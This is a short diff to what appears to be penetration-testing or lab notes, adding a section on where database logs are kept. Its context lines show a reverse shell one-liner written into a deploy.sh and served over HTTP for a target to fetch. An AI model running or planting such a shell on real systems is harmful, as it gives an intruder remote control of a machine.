@@ -26,3 +26,7 @@ Create a deploy.sh file > sh -i >& /dev/tcp/127.0.0.1/5001 0>&1
 
 Serve the file through http 
 python3 -m http.server 80
+
+# Logs
+Logs are found in multiple locations.
+Database logs are found in /opt/shopwebserver/database.log
